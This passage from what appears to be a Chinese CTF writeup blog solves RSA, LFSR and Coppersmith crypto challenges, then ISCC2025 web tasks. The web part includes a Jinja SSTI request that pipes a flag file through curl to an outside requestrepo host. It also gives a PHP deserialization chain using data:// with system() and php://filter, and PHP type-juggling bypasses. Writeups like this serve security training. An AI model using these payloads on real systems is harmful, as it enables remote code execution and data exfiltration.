(q - 1)`。\n  - 计算私钥指数 `d = gmpy2.invert(e, phi)`。\n\n- 解密密文\n  - 使用私钥和 PKCS#1 v1.5 填充方案解密 `flag.enc` 文件中的内容。\n\n最终的exp\n\n```python\nimport gmpy2\nfrom Crypto.Util.number import getPrime,inverse\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\nfrom base64 import b64encode, b64decode\n\n# 读取内容\nflag_encode = b64decode(open('flag.enc', 'r').read())\npubkey = RSA.importKey(open('pubkey.pem', 'r').read())\n\n# 提取 n 和 e\nn = pubkey.n  # 模数\ne = pubkey.e  # 公钥指数\n\n# print(n)\n#n = 62078208638445817213739226854534031566665495569130972218813975279479576033261\n# print(e)\n#e = 9850747023606211927\n# 分解 n 拿到 p 和 q\nq = 184333227921154992916659782580114145999\np = 336771668019607304680919844592337860739\n\n#解密\nwhile True:\n    n = p * q\n    if n >= int(flag_encode.hex(), 16):\n        \n        #欧拉函数的phi\n        phi = (p-1)*(q-1)\n        #私钥模数d\n        d = inverse(e,phi)\n        \n        #创建私钥\n        privkey = RSA.construct((int(n), int(e), int(d)))\n        key = PKCS1_v1_5.new(privkey)\n        \n        #解密\n        flag = key.decrypt(flag_encode,None)\n        \n        #因为flag是重复了23次的\n        L = len(flag) // 23\n        single_flag = flag[:L]\n        print(single_flag)\n        break\n    else:\n        p = gmpy2.next_prime(p ** 2 + q ** 2)\n        q = gmpy2.next_prime(2 * p * q)\n        e = gmpy2.next_prime(e ** 2)\n```\n\n前面写的时候一直报错，PKCS#1 v1.5 要求密文的长度必须与 RSA 模数 `n` 的字节长度一致，一开始的模数n是解不出来的，那个仅仅是公钥里面的n，和加密函数里面的n是不一样的，所以需要爆破爆出来\n\n# 线性反馈移位寄存器(GFSJ1082)\n\n## #线性反馈移位寄存器伪随机数生成器\n\n分析一下附件\n\n```python\nfrom secret import secret#从secret中导入secret\nfor b in secret: assert(b == '0' or b == '1')#遍历secret中的每一个字符，检查是否等于1或0\nassert(len(secret) == 128)#检查secret的字符长度是否为128\n# a 01 string with length 128\n# your flag is flag{md5(secret).hexdigest()}#提示flag 是 secret 的 MD5 哈希值的十六进制表示\n\ndef string2bits(s):#将二进制字符串 s 转换为整数列表的函数\n    return [int(b) for b in s]\n\ndef bits2string(bs):#将字符串s中的字符转化成整数\n    s = [str(b) for b in bs]\n    return ''.join(s)\n\ndef lfsr(state, mask):\n    assert(len(state) == 128)\n    assert(len(mask)  == 128)\n\n    output = 0\n    for i in range(128):\n        output = output ^ (state[i] & mask[i])\n\n    return output\n\nif __name__ == '__main__':\n    initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]\n    mask = string2bits(secret)\n\n    for i in range(256):\n        state = initState[i:]\n        output = lfsr(state, mask)\n        initState += [output]\n\n    outputState = bits2string(initState[128:])\n    print('outputState =', outputState)\n    #\n    # outputState = 1010100001001011101000000100100001101011010100101011010101011010100100001110010010110111010111110000000000011011001110100011000111110100110011011011100111000000001100001000001011010011011010110110111100110101001110001001001000001110111011110001111001111111\n    #\n\n\n```\n\n一个基于 **线性反馈移位寄存器 (LFSR)** 的伪随机数生成器https://blog.csdn.net/weixin_37414365/article/details/139606928\n\n先分析一下前面两个转化函数\n\n```python\ndef string2bits(s):#将一个二进制字符串 s 转换为一个整数列表。\n    return [int(b) for b in s]\n\ndef bits2string(bs):#将一个整数列表 bs 转换回一个二进制字符串。\n    s = [str(b) for b in bs]\n    return ''.join(s)\n```\n\n不清楚的话可以直接本地测试实操一下\n\n![image-20250517133741039](../image/achieve/202411/攻防世界/image-20250517133741039.png)\n\n最重要的还是最后一个**线性反馈移位寄存器 (LFSR)**的实现函数\n\n```python\ndef lfsr(state, mask):\n    assert(len(state) == 128)\n    assert(len(mask)  == 128)\n\n    output = 0\n    for i in range(128):\n        output = output ^ (state[i] & mask[i])\n\n    return output\n```\n\n输入两个长度为128数组 `state, mask` ，输出 `output` 值为$out=\\sum{state_i \\times mask_i} \\mod 2$\n\n所以这里的话会遍历每个状态和反馈，\n\n`output = output ^ (state[i] & mask[i])`\n\n- 计算 `state[i]` 和 `mask[i]` 的按位与（`&`），然后与当前的 `output` 进行按位异或（`^`）。这一步实现了 LFSR 的反馈逻辑。\n\n然后我们需要注意一个点，**在二进制运算中，异或运算（`^`）和模 2 的加法（`mod 2`）是等价的，位与运算(&)和模2的乘法是等价的。**\n\n本地测试一下\n\n![image-20250517135348001](../image/achieve/202411/攻防世界/image-20250517135348001.png)\n\n那么我们就可以算进行解密了\n\ninitState是初始化数组，也是LFSR的初始状态，`mask` 是secret转二进制之后的内容\n\n然后最主要的操作就是进行256轮LFSR计算，注意到每轮 `state` 数组取值会向右移动一个位置，同时 `initState` 长度会增长1，即数组尾部追加了 `output` 值\n\n这里有点小复杂，看看官方wp怎么说的\n\n### **关键关系式**\n\n1. **原始关系式**：\n   $$\n   out=∑state i​×mask i​    mod2\n   $$\n   \n\n   - 表示状态向量（`state`）和掩码向量（`mask`）的点积，再取模 2。\n\n2. **矩阵乘法形式**：\n   $$\n   out=State×Maskmod2\n   $$\n   \n\n   - 这里，`State` 是一个 1×1281×128 的行向量，`Mask` 是一个 128×1128×1 的列向量。\n   - 矩阵乘法的结果是一个标量（即一个数），再取模 2。\n\n```python\n# sage\ndef string2bits(s):\n    return [int(b) for b in s]\n\n\nif __name__ == '__main__':\n    initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0,\n                 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0,\n                 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1,\n                 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]\n    outputState = string2bits(\n        '1010100001001011101000000100100001101011010100101011010101011010100100001110010010110111010111110000000000011011001110100011000111110100110011011011100111000000001100001000001011010011011010110110111100110101001110001001001000001110111011110001111001111111')\n    states = initState + outputState\n\n    ms = MatrixSpace(GF(2), 128, 128)\n    mv = []\n    for i in range(128):\n        mv += states[i: i + 128]\n    m = ms(mv)\n\n    vs = MatrixSpace(GF(2), 128, 1)\n    vv = outputState[0:128]\n    v = vs(vv)\n\n    secret = m.inverse() * v\n    M = secret.str().replace('\\n', '').replace('[', '').replace(']', '')\n    print(M)\n```\n\n其实这里的话也是根据一个矩阵的乘法和加法来实现二进制运算，从而进行解密\n\n这里需要SageMath环境，可以手动安装一下，我在Ubuntu安装的\n\n```\nsudo apt update\nsudo apt install sagemath\n```\n\n![image-20250517142850152](../image/achieve/202411/攻防世界/image-20250517142850152.png)\n\n安装好之后直接把代码传sage里运行就行，当热也可以编辑成sage文件然后run一下\n\n![image-20250517143409414](../image/achieve/202411/攻防世界/image-20250517143409414.png)\n\n之前提示\n\n```\nflag{md5(secret).hexdigest()}\n```\n\n所以我们需要再进行解码\n\n```\nsecret = 01000101011000010111001101111001010011010110000101110100011010000101011101101001011101000110100001010011011000010110011101100101\n```\n\n然后解码一下吧\n\n```python\nimport hashlib\n\nsecret_bin = \"01000101011000010111001101111001010011010110000101110100011010000101011101101001011101000110100001010011011000010110011101100101\"\n\nsecret_bytes = bytes([int(secret_bin[i:i+8], 2) for i in range(0, len(secret_bin), 8)])\n\nflag = hashlib.md5(secret_bytes).hexdigest()\n\nprint(flag)\n```\n\n# rsarsa(GFSJ1074)\n\n## #一个很简单的RSA算法\n\n看看附件\n\n```python\nfor _ in range(3):#循环三次\n    p = random_prime(2^1024)\n    q = random_prime(2^1024)#两个1024位的随机素数p和q\n    \n    n = p*q#RSA模数n\n    \n    p1 = p>>724#将p右移724位，提取p的高位部分\n    ct=n * inverse_mod(q % (2 ** 265), 2^265) % 2^265#计算\n    print('p1=',p1)\n    print('ct=',ct)\n    print(\"n=\",n)\n    e = 65537#设置公钥指数e\n    alarm(80)\n    m = randint(2,n-1)\n    c=pow(m,e,n)\n    print('c=', c)\n    print('---------------------------------------------')\n    m1 = int(input(\"m=\"))#如果传入的m1不等于m，则报错退出\n    print('---------------------------------------------')\n    print()\n    if m1!=m:\n        print(\"Nope\")\n        exit()\n\nprint(open(\"flag.txt\",\"r\").read())\n```\n\n因为p是1024位素数，右移724位之后p1就是p的前300位\n\n重点看ct的赋值算法\n\n```\nct=n * inverse_mod(q % (2 ** 265), 2^265) % 2^265\n```\n\n- `q % (2 ** 265)`这里提取了q的最低265位二进制数，而`inverse_mod(q % (2 ** 265), 2^265)`是计算q的低位在模`2**265`下的逆元\n- 将n与逆元相乘并取模`2**265`，确保结果的范围在 00 到 2265−12265−1 之间。\n\n所以所以公式最终简化为 \n$$\nct≡pmod2 265\n$$\n\n\n所以结合p1和ct就可以恢复完整的p了\n\n三次每次循环生成一个新的 RSA 密钥对，加密一个随机明文，要求用户解密。\n\n所以我们每次都要去解出解密后的明文m1\n\n连接一下环境\n\n```\nnc 223.112.5.141 60803\n```\n\n然后官方的wp解密脚本就是\n\n```python\np1= 1807577577259163170808032870349282112282571323591845429300441570184247418055652820688965806\nct= 22927880275919106420724817686996316657328659836193810443309428227773083712260759\nn= 20918042904587146770849074395088763454020944898516109240032730567541019968369060106932371073166962516723371945016821277000260269914302467907270173267316489205123250212947384927965463180326553488208808695726664793589631118262438341786216697215354759329036530460924784825876096098066978195841501991016797790159664644141375212011815849442250550681413125881040984599602800185847697327897104897883843784160460997938677180874387082122363196730868860410640935996241947002256533290823223089350984854133715502806708037638247661663852479509984048499208048621265253809367272239632780903244799299048384542054140137465355434960463\nc= 3874746763024138133755104003445374504171230824966801402127496270504899670136145422790198882660816135484718129951170945056244973415573370919726492823907953720770541275517919996933506123841940110204272049717496889997831708272313717483010706599347176753458718301913256003259737842197075748180620849851173090156659045604292932074883709161865158815955477575775735629502049228296916462165395917126252560471632487007699378762909723971548067605840500379941107819406836379219394916662845881575334554766329576561853013842727515446160180929538411820618426434341463882299756324336858937396061015596457039259190115802621577491764\nmod=pow(2,265)\n# ct=n * inverse_mod(q mod (2 ** 265), 2^265) mod 2^265\npbar=(p1<<724)+ct\nPR.<x> = PolynomialRing(Zmod(n))\nfor i in range(32):\n    f=pbar+x*mod*32\n    f=f.monic()\n    pp=f.small_roots(X=2^454,beta=0.4)\n    if(pp):\n        break\n    pbar+=mod\nassert pp\np=pbar+pp[0]*32*mod\n\nq=n//Integer(p)\ne=65537\nphi=(p-1)*(q-1)\n# d = gmpy2.invert(e, (p - 1) *(q - 1))\n# m = powmod(c, d, n)\nd = inverse_mod(e, phi)\nm = pow(c, d, n)\nprint(m)\n```\n\n![image-20250517151442997](../image/achieve/202411/攻防世界/image-20250517151442997.png)\n\n![image-20250517151428311](../image/achieve/202411/攻防世界/image-20250517151428311.png)\n\n# Untitled(GFSJ0087)\n\n分析一下附件\n\n```python\nfrom Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long\nimport primefac\nimport time\nfrom os import urandom\nimport hashlib\nimport sys\nclass Unbuffered(object):\n   def __init__(self, stream):\n       self.stream = stream\n   def write(self, data):\n       self.stream.write(data)\n       self.stream.flush()\n   def __getattr__(self, attr):\n       return getattr(self.stream, attr)\nimport sys\nsys.stdout = Unbuffered(sys.stdout)\ndef gen_args():\n    p=getPrime(1024)\n    q=getPrime(1024)\n    n=p*q\n    e=0x10001\n    d=primefac.modinv(e,(p-1)*(q-1))%((p-1)*(q-1))\n    return (p,q,e,n,d)\ndef proof():\n    salt=urandom(4)\n    print salt.encode(\"base64\"),\n    proof=raw_input(\"show me your work: \")\n    if hashlib.md5(salt+proof.decode(\"base64\")).hexdigest().startswith(\"0000\"):\n        print \"checked success\"\n        return 1\n    return 0\n\ndef run():\n    if not proof():\n        return\n    m=int(open(\"/home/bibi/PycharmProjects/work/whctf/flag\",\"r\").read().encode(\"hex\"),16)#flag{*}\n    (p,q,e,n,d)=gen_args()\n    c=pow(m,e,n)\n    print \"n:\",hex(n)\n    print \"e:\",hex(e)\n    print \"c:\",hex(c)\n    t=int(hex(m)[2:][0:8],16)\n    u=pow(t,e,n)\n    print \"u:\",hex(u)\n    print \"====\"\n    x=int(hex(m)[2:][0:8]+raw_input(\"x: \"),16)\n    print \"====\"\n    y=int(raw_input(\"y: \"),16)\n    if (pow(x,e,n)==y and pow(y,d,n)==t):\n        print \"s:\",hex(int(bin(p)[2:][0:568],2))\nrun()\n```\n\n\n\n# hack_in_the_card_I(GFSJ0157)\n\n# asm(GFSJ0198)\n\n# B64(GFSJ0218)\n\n看一下附件\n\n```python\n#!/usr/bin/python2\n\nfrom flag import flag\nfrom base64 import b64decode\nfrom SocketServer import ThreadingTCPServer\nfrom sys import argv\nfrom binascii import hexlify, unhexlify\nimport SocketServer\nimport os\n\nN = 8\nMAX_TRIES = 1024\nPAD = 64\n\nwelcome = \"Welcome! :-)\\n\"\nmenu = \"What would you like to do:\\n\\t1: supply encoded input,\\n\\t2: tell me my secret\\n> \"\n\ndef gen_secret():\n    return os.urandom(N)#生成 N 个字节的随机数据。\n\ndef crypt(s1, s2):\n    return \"\".join(map(lambda c: chr(((ord(c[0])^ord(c[1]))+PAD)%256), zip(s1,s2)))\n#内层将第一个和第二个字符的ASCII码值进行异或处理，然后加上常量PAD，并将结果对256取模，最后将结果转换为对应的 ASCII 字符。\n#zip将 s1 和 s2 逐字符配对，生成一个元组的迭代器。\n#将结果转换为字符，并连接成最终的加密字符串。\n\nb64chars = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/\"\ndef decode(s, secret):\n    enc = \"\"#初始化一个空字符串 enc，用于存储处理后的 Base64 编码数据。\n    s = crypt(s, secret)#调用 crypt 函数，对字符串 s 和 secret 进行加密操作。\n    \n    for c in s:#遍历s中的每个字符\n        if c in b64chars:#看该字符是否符合base64规定的合法字符\n            enc+=c#enc收集所有符合的合法字符\n\n    if len(enc) % 4 == 1:#如果 enc 的长度除以 4 余 1，则去掉最后一个字符。这是因为 Base64 编码的长度必须是 4 的倍数\n        enc = enc[:-1]\n\n    while len(enc) % 4 != 0:#如果 enc 的长度不是 4 的倍数，则追加 \"=\" 字符，直到长度满足要求。\n        enc+=\"=\"\n\n    return b64decode(enc)\n#其实就是base64的操作，只不过这里对传入的字符进行了合法的处理 \n\nclass B64Handler(SocketServer.BaseRequestHandler):\n    def setup(self):\n        self.tries = 0\n        self.secret = gen_secret()#生成一个随机的秘密值，并将其存储在实例变量 secret 中。\n\n    def handle(self):\n        self.request.send(welcome)\n        for i in range(MAX_TRIES):\n            self.request.send(\"Round number: {}\\n{}\".format(i, menu))#像客户端发送当前轮次（i）和菜单选项(menu)\n            if self.request.recv(2)[0] == \"1\":#检测客户端的输入第一个字符是否位1\n                self.request.send(\"What would you like me to decode?\\n> \")#如果选择1则返回提示信息\n                answer = self.request.recv(len(self.secret))#接收用户的输入，长度为secret的长度\n                decoded = decode(answer, self.secret)#进行decode函数解码操作\n                self.request.send(\"Alright, here is your answer: {}\\n\".format(decoded))#输出解码后的结果\n\n            else:\n                self.request.send(\"Alright, what is my secret (hex encoded)?\\n> \")#要求客户端输入 self.secret 的十六进制编码。\n                answer = self.request.recv(2*len(self.secret)+1).rstrip()#接收客户端的输入，长度为 2*len(self.secret)+1，并去掉末尾的空白字符。\n                if answer==hexlify(self.secret):#检查客户端的输入是否与 self.secret 的十六进制编码一致。\n                    self.request.send(\"Well done, here is your flag: {}\\n\".format(flag))#如果一致则输出flag\n                else:\n                    self.request.send(\"This was not what I was looking for. :-(\\n\")\n                break\n\n        self.request.send(\"Bye!\\n\")\n\ndef main():\n    SocketServer.ThreadingTCPServer.allow_reuse_address = True\n    if len(argv) < 2:\n        print(\"Usage: {} <PORT>\".format(argv[0]))\n    else:\n        LOCAL_PORT = int(argv[1])\n        s = SocketServer.ThreadingTCPServer((\"\", LOCAL_PORT), B64Handler)\n        try:\n            s.serve_forever()\n        except KeyboardInterrupt:\n            print(\"shutting down\")\n            s.shutdown()\n            s.socket.close()\n\nif __name__ == \"__main__\":\n    main()\n\n\n```\n\n\n\n# McEliece(GFSJ0219)\n\n# crackme_c1(GFSJ0281)\n\n# Luaky(GFSJ0306)\n\n# Secret_FS(GFSJ0307)\n\n# broken-box(GFSJ0432)\n\n# neo(GFSJ0433)\n\n# fez(GFSJ0783)\n","tags":["Crypto"],"categories":["密码学"]},{"title":"ISCC2025国赛web","url":"/2025/05/16/ISCC2025国赛web/","content":"\n# 0x01前言\n\n真的很想喷这个比赛的服务器和环境，每次要么打到一半就卡死了要么平台都进不去，而且还是公共平台，太让我失望了感觉，而且很多无厘头的猜谜，一点知识点都没有\n\n# 区域赛\n\n## 哪吒的试炼\n\n![image-20250510100546724](../image/achieve/202411/ISCC2025/image-20250510100546724.png)\n\n根据食物和莲藕的提示，猜测传入?food=lotus root后发现有302跳转\n\n![image-20250510100628656](../image/achieve/202411/ISCC2025/image-20250510100628656.png)\n\n在前端代码中删去disable即可解开封印\n\n![image-20250510100711305](../image/achieve/202411/ISCC2025/image-20250510100711305.png)\n\n拿到源码\n\n```php\n<?php\nif (isset($_POST['nezha'])) {\n    $nezha = json_decode($_POST['nezha']);\n\n    $seal_incantation = $nezha->incantation;  \n    $md5 = $nezha->md5;  \n    $secret_power = $nezha->power;\n    $true_incantation = \"I_am_the_spirit_of_fire\";  \n\n    $final_incantation = preg_replace(\n        \"/\" . preg_quote($true_incantation, '/') . \"/\", '',\n        $seal_incantation\n    );\n\n    if ($final_incantation === $true_incantation && md5($md5) == md5($secret_power) && $md5 !== $secret_power) {\n        show_flag(); \n    } else {\n        echo \"<p>封印的力量依旧存在，你还需要再试试!</p>\";\n    }\n} else {\n    echo \"<br><h3>夜色渐深，风中传来隐隐的低语……</h3>\";\n    echo \"<h3>只有真正的勇者才能找到破局之法。</h3>\";\n}\n?>\n```\n\n这里会在seal中去掉true的内容，但是又要求去掉后得等于true的内容，这里怎么绕过呢\n\n本地测试了一下\n\n![image-20250510104036133](../image/achieve/202411/sql注入--ctfshow/image-20250510104036133.png)\n\n所以双写绕过就可以了\n\n```\nnezha={\"incantation\":\"I_am_the_spiI_am_the_spirit_of_firerit_of_fire\",\"md5\":\"240610708\",\"power\":\"QNKCDZO\"}\n```\n\n## 回归基本功\n\n![image-20250510114441804](../image/achieve/202411/sql注入--ctfshow/image-20250510114441804.png)\n\n看了这里用户代理猜到是UA头，但是传入那两个例子没什么变化，后面看到提示是计算机行业的专家，然后看到高级工程师，猜测就是这个人，在process.php页面传UA头`GaoJiGongChengShiFoYeGe`拿到源码文件\n\n\n\n![image-20250510190802445](../image/achieve/202411/sql注入--ctfshow/image-20250510190802445.png)\n\n```php\n<?php\nshow_source(__FILE__);\ninclude('E8sP4g7UvT.php');\n$a=$_GET['huigui_jibengong.1'];\n$b=$_GET['huigui_jibengong.2'];\n$c=$_GET['huigui_jibengong.3'];\n\n$jiben = is_numeric($a) and preg_match('/^[a-z0-9]+$/',$b);\nif($jiben==1)\n{\n    if(intval($b) == 'jibengong')\n    {\n        if(strpos($b, \"0\")==0)\n        {\n            echo '基本功不够扎实啊！';\n            echo '<br>';\n            echo '还得再练！';  \n        }\n        else\n        {\n            $$c = $a;\n            parse_str($b,$huiguiflag);\n            if($huiguiflag[$jibengong]==md5($c))\n            {\n                echo $flag;\n            }\n            else{\n                echo '基本功不够扎实啊！';\n                echo '<br>';\n                echo '还得再练！'; \n            }\n        } \n    }\n    else\n    {\n        echo '基本功不够扎实啊！';\n        echo '<br>';\n        echo '还得再练！'; \n    }\n}\nelse\n{\n    echo '基本功不够扎实啊！';\n    echo '<br>';\n    echo '还得再练！'; \n}\n?>\n```\n\n一层层进吧\n\n先看第一层\n\n```php\n$jiben = is_numeric($a) and preg_match('/^[a-z0-9]+$/',$b);\nif($jiben==1)\n```\n\n这里的话因为and优先级比较低，所以jiben的值只取决于$a的条件，设置$a为数字就行\n\n```\n?huigui[jibengong.1=1\n```\n\n然后看第二层\n\n```php\nif(intval($b) == 'jibengong')\n```\n\n让b的值用+0或者e都行，intval会解析为0，然后字符串也是0，弱等于满足\n\n![image-20250516194633961](../image/achieve/202411/ISCC2025/image-20250516194633961.png)\n\n```php\nif(strpos($b, \"0\")==0)\n```\n\n我们需要进入else语句，所以$b的开头不能为0\n\n```php\n$$c = $a;\nparse_str($b,$huiguiflag);\nif($huiguiflag[$jibengong]==md5($c))\n{\n    echo $flag;\n}\n```\n\n有动态变量和变量覆盖，因为这里需要设置$huiguiflag中的键$jibengong为md5($c)，但是直接传\n\n```\n类似$b=\"$jibengong=1\"\n```\n\n这样貌似不行，会解析错误，尝试让该键的键名换一下，那就只能在动态变量中玩一下了\n\n```\n设置c=jibengong\n因为之前设置$a=1\n因此\n$jibengong=1\n然后我们对b传入\n$b=\"e&1=e559dcee72d03a13110efe9b6355b30d\"\ne559dcee72d03a13110efe9b6355b30d为jibengong的md5值\n```\n\n所以最后的payload(注意这里的参数解析)\n\n![3e128b5416bb7dce2f445037e2651ec](../image/achieve/202411/ISCC2025/3e128b5416bb7dce2f445037e2651ec.png)\n\n调试过程\n\n![8abee7a5ceffd6688af43bd1df51cc1](../image/achieve/202411/ISCC2025/8abee7a5ceffd6688af43bd1df51cc1.png)\n\npayload\n\n```\n?huigui[jibengong.1=1&huigui[jibengong.2=e%261=e559dcee72d03a13110efe9b6355b30d&huigui[jibengong.3=jibengong\n```\n\n## 十八铜人阵\n\n需要传入六个方位，电影中依次是\n\n```\n西南方\n东南方\n北方\n西方\n东北方一个，东方一个\n```\n\n测了半天，才知道最后一个是get传的参数，虽然他参数名给的提示蛮明显的但是之前没试过\n\n请求包\n\n```\nPOST /submit-answers?aGnsEweTr6=%E4%B8%9C%E6%96%B9 HTTP/1.1\nHost: 112.126.73.173:16340\nAccept-Language: zh-CN,zh;q=0.9\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nOrigin: http://112.126.73.173:16340\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: http://112.126.73.173:16340/\nX-Requested-With: XMLHttpRequest\nAccept: */*\nContent-Length: 173\n\nanswer1=%E8%A5%BF%E5%8D%97%E6%96%B9&answer2=%E4%B8%9C%E5%8D%97%E6%96%B9&answer3=%E5%8C%97%E6%96%B9&answer4=%E8%A5%BF%E6%96%B9&answer5=%E4%B8%9C%E5%8C%97%E6%96%B9\n```\n\n![image-20250513102008467](../image/achieve/202411/ISCC2025/image-20250513102008467.png)\n\n源码中找到一个路由，带着cookie访问\n\n![image-20250513102334714](../image/achieve/202411/sql注入--ctfshow/image-20250513102334714.png)\n\n之前在源码看到很多佛曰，然后查到了佛曰解密https://pi.hahaka.com/\n\n![image-20250513111143308](../image/achieve/202411/sql注入--ctfshow/image-20250513111143308.png)\n\n挨个拿去解一下拿到\n\n![image-20250513111646518](../image/achieve/202411/sql注入--ctfshow/image-20250513111646518.png)\n\n\n\n路由是探本穷源拼音反过来nauygnoiqnebnat（猜半天真的想喷人， 只能说是我太菜了）\n\n访问后是需要传一个yongzheng，测出来是ssti，但是fenjing还不能跑，直接绕过打curl外带\n\n```http\nPOST /nauygnoiqnebnat?a=__globals__&b=__getitem__&c=os&d=popen&e=curl+https://4fz7yove.requestrepo.com/`cat+kGf5tN1yO8M|base64` HTTP/1.1\nHost: 112.126.73.173:16340\nContent-Length: 134\nPragma: no-cache\nCache-Control: no-cache\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://112.126.73.173:16340\nReferer: http://112.126.73.173:16340/nauygnoiqnebnat\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: session=eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCKsMQ.X9UWN4Wx1zFF6vpu-9nl0JU5vDQ\nConnection: close\n\nyongzheng={{(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.e)).read()}}\n```\n\n然后接收\n\n![image-20250513111002657](../image/achieve/202411/sql注入--ctfshow/image-20250513111002657.png)\n\n解码后拿到目录\n\n![image-20250513111011784](../image/achieve/202411/sql注入--ctfshow/image-20250513111011784.png)\n\nkGf5tN1yO8M就是flag文件，读一下就出来了\n\n## 想犯大吴疆土吗\n\n传入那四个装备拿到源码\n\n```http\nGET /?box1=%E5%8F%A4%E9%94%AD%E5%88%80&box2=%E6%9D%80&box3=%E9%85%92&box4=%E9%93%81%E7%B4%A2%E8%BF%9E%E7%8E%AF HTTP/1.1\nHost: 112.126.73.173:49101\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: PHPSESSID=515a4a744cb2d53dd77dd970febd696a\nConnection: close\n\n\n```\n\n拿到reward.php\n\n```php\n<?php\nif (!isset($_GET['xusheng'])) {\n    ?>\n    <html>\n    <head><title>Reward</title></head>\n    <body style=\"font-family:sans-serif;text-align:center;margin-top:15%;\">\n        <h2>想直接拿奖励？</h2>\n        <h1>尔要试试我宝刀是否锋利吗？</h1>\n    </body>\n    </html>\n    <?php\n    exit;\n}\n\nerror_reporting(0);\nini_set('display_errors', 0);\n?>\n\n<?php\n\n// 犯flag.php疆土者，盛必击而破之！\n\nclass GuDingDao {\n    public $desheng;\n\n    public function __construct() {\n        $this->desheng = array();\n    }\n\n    public function __get($yishi) {\n        $dingjv = $this->desheng;\n        $dingjv();\n        return \"下次沙场相见, 徐某定不留情\";\n    }\n}\n\nclass TieSuoLianHuan {\n    protected $yicheng;\n\n    public function append($pojun) {\n        include($pojun);\n    }\n\n    public function __invoke() {\n        $this->append($this->yicheng);\n    }\n}\n\nclass Jie_Xusheng {\n    public $sha;\n    public $jiu;\n\n    public function __construct($secret = 'reward.php') {\n        $this->sha = $secret;\n    }\n\n    public function __toString() {\n        return $this->jiu->sha;\n    }\n\n    public function __wakeup() {\n        if (preg_match(\"/file|ftp|http|https|gopher|dict|\\.\\./i\", $this->sha)) {\n            echo \"你休想偷看吴国机密\";\n            $this->sha = \"reward.php\";\n        }\n    }\n}\n\necho '你什么都没看到？那说明……有东西你没看到<br>';\n\nif (isset($_GET['xusheng'])) {\n    @unserialize($_GET['xusheng']);\n} else {\n    $a = new Jie_Xusheng;\n    highlight_file(__FILE__);\n}\n\n// 铸下这铁链，江东天险牢不可破！\n\n```\n\n这个链子的话触发是通过正则去触发`__toString()`的，然后正常打就行\n\n```\nJie_Xusheng::__wakeup()->Jie_Xusheng::__toString()->GuDingDao::__get()->TieSuoLianHuan::__invoke()->TieSuoLianHuan::append()\n```\n\n```php\n<?php\nclass GuDingDao {\n    public $desheng;\n}\n\nclass TieSuoLianHuan {\n    public $yicheng;\n}\n\nclass Jie_Xusheng {\n    public $sha;\n    public $jiu;\n\n}\n\n$a=new Jie_Xusheng();\n$a->sha=new Jie_Xusheng();\n$a->sha->jiu=new GuDingDao();\n//$a->sha->jiu->desheng=phpinfo;\n$a->sha->jiu->desheng=new TieSuoLianHuan();\n$a->sha->jiu->desheng->yicheng='data://text/plain,<?php system(\"ls\"); ?>';\necho urlencode(serialize($a));\n```\n\n结果本地出来了远程没出来，想起之前在源码给的一个暗示，说是有坑，猜测某个类的类名和属性名有问题，最后找出来是`GuDingDao`这个类有问题\n\n最终的payload\n\n```php\n<?php\nclass GuDingDa0 {\n    public $desheng;\n}\n\nclass TieSuoLianHuan {\n    public $yicheng;\n}\n\nclass Jie_Xusheng {\n    public $sha;\n    public $jiu;\n\n}\n\n$a=new Jie_Xusheng();\n$a->sha=new Jie_Xusheng();\n$a->sha->jiu=new GuDingDa0();\n//$a->sha->jiu->desheng=phpinfo;\n\n$a->sha->jiu->desheng=new TieSuoLianHuan();\n/*$a->sha->jiu->desheng->yicheng='data://text/plain,<?php system(\"whoami\"); ?>';*/\n$a->sha->jiu->desheng->yicheng='php://filter/convert.base64-encode/resource=flag.php';\necho urlencode(serialize($a));\n```\n\n# 决赛\n\n## 